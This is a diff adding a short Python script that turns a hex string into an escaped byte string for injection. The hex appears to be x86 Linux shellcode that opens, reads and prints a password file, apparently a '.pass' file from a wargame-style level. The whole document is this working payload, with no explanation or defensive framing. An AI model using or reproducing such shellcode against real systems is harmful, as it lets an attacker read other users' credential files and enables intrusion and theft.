@@ -1,0 +1,6 @@
+payload_bytes = "6a73682e706173686c30342f686c657665686572732f68652f7573682f686f6db80500000031c931d289e3cd8089c3b80300000089e1ba64000000cd80bb0100000089c2b80400000089e1cd8031db31c040cd80"
+
+out = ""
+for i in range(0, len(payload_bytes), 2):
+    out += "\\x" + payload_bytes[i : i + 2]
+print(out)
